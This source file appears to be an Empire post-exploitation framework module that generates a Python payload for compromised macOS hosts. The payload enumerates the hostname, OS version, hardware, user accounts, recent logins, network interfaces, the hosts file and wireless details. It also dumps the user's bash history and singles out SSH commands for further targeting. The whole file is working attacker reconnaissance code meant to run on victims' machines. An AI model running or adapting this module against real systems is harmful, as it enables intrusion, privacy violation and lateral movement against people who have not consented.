from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        script = ''
        if params['Debug']:
            debug = params['Debug']
            script += "Debug = " + str(debug) + '\n'
        if params['HistoryCount']:
            search = params['HistoryCount']
            script += 'HistoryCount = ' + str(search) + '\n'

        script += """
try:
    import subprocess
    import sys
    import os
    import time
    from os.path import expanduser
    # Get Home User
    home = str(expanduser("~"))
    sudo = True
    # Check for sudo privs, if true than set true
    process = subprocess.Popen('which sudo|wc -l', stdout=subprocess.PIPE, shell=True)
    result = process.communicate()
    result = result[0].strip()
    if str(result) != "1":
        print("[!] ERROR some shit requires (sudo) privileges!")
        sudo = False
        sys.exit()
    # Enum Hostname
    try:
        process = subprocess.Popen('hostname', stdout=subprocess.PIPE, shell=True)
        hostname = process.communicate()
        hostname = hostname[0].strip()
        print("[*] Hostname:")
        print((" - " + str(hostname.strip())))
    except Exception as e:
        if Debug:
            print(("[!] Error enumerating hostname: " + str(e)))
        pass
    # Enum Software Package
    try:
        process = subprocess.Popen('sw_vers -productVersion', stdout=subprocess.PIPE, shell=True)
        swvers = process.communicate()
        swvers = swvers[0].strip()
        print("[*] MAC OS Package Level:")
        print((" - " + str(swvers.strip())))
    except Exception as e:
        if Debug:
            print(("[!] Error enumerating OS Package: " + str(e)))
        pass
    # Enume system Hardware Overview
    try:
        process = subprocess.Popen("system_profiler SPHardwareDataType", stdout=subprocess.PIPE, shell=True)
        ho = process.communicate()
        ho = ho[0].split('\\n')
        print("[*] Hardware Overview:")
        for x in ho[4:]:
            if x:
                print((" - " + str(x.strip())))
    except Exception as e:
        if Debug:
            print(("[!] Error enumerating Hardware Overview: " + str(e)))
    # Enum Users
    try:
        process = subprocess.Popen("dscacheutil -q user | grep -A 3 -B 2 -e uid:\ 5'[0-9][0-9]'", stdout=subprocess.PIPE, shell=True)
        users = process.communicate()
        users = users[0].split('\\n')
        print("[*] Client Users:")
        for x in users:
            if x:
                print(" - " + str(x.strip()))
            else:
                print()
    except Exception as e:
        if Debug:
            print("[!] Error enumerating OS Package: " + str(e))
        pass
    # Enum Last Logins
    try:
        print("[*] Last Logins:")
        process = subprocess.Popen("last -10", stdout=subprocess.PIPE, shell=True)
        last = process.communicate()
        last = last[0].split('\\n')
        for x in last:
            if x.startswith('wtmp'):
                break
            if x:
                print(" - " + str(x.strip()))
    except Exception as e:
        if Debug:
            print("[!] Error Enumerating en0: " + str(e))
        pass
    # Enum Hardware
    try:
        process = subprocess.Popen("networksetup -listallhardwareports", stdout=subprocess.PIPE, shell=True)
        hardware = process.communicate()
        hardware = hardware[0].split('\\n')
        print("[*] Installed Interfaces:")
        for x in hardware:
            if x:
                print(" - " + str(x.strip()))
            else:
                print()
    except Exception as e:
        if Debug:
            print("[!] Error Enumerating Installed Interfaces: " + str(e))
        pass
    # Enum en0
    try:
        process = subprocess.Popen("ipconfig getpacket en0", stdout=subprocess.PIPE, shell=True)
        inf = process.communicate()
        inf = inf[0].split('\\n')
        print("[*] en0 Interface:")
        for x in inf:
            if x:
                print(" - " + str(x.strip()))
            else:
                print()
    except Exception as e:
        if Debug:
            print("[!] Error Enumerating en0: " + str(e))
        pass
    # Enum Hosts DNS file
    try:
        process = subprocess.Popen("cat /private/etc/hosts", stdout=subprocess.PIPE, shell=True)
        hosts = process.communicate()
        hosts = hosts[0].split('\\n')
        print("[*] DNS Hosts File:")
        for x in hosts:
            if x:
                if x.startswith("#"):
                    pass
                else:
                    print(" - " + str(x.strip()))
            else:
                print()
    except Exception as e:
        if Debug:
            print("[!] Error Enumerating Hosts File: " + str(e))
        pass

    # Enum bash history
    try:
        location = home + "/.bash_history"
        with open(location, 'r') as myfile:
            HistoryResult = myfile.readlines()
        HistoryCount = HistoryCount * -1
        print("[*] Enumerating User Bash History")
        print(" - History count size: " + str(len(HistoryResult)))
        for item in HistoryResult[HistoryCount:]:
            print("    * " + str(item.strip()))
        print("[*] SSH commands in History: ")
        for item in HistoryResult:
            if "ssh" in item.lower():
                print("    * " + str(item.strip()))
    except Exception as e:
        if Debug:
            print("[!] Error enumerating user bash_history: " + str(e))
        pass
        
    # Enum Wireless Connectivity Info
    try:
        process = subprocess.Popen(executable="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", args="-I", stdout=subprocess.PIPE, shell=True)
        wireless = process.communicate()
        if wireless[0] != '':
            wireless = wireless[0].split('\\n')
            print("[*] Wireless Connectivity Info:")
            for x in wireless:
                if x:
                    print(" - " + str(x.strip()))
                else:
                    print()
    except Exception as e:
        if Debug:
            print("[!] Error enumerating user Wireless Connectivity Info: " + str(e))
        pass         

    # Enum AV / Protection Software

except Exception as e:
    print(e)"""

        # add any arguments to the end exec

        return script
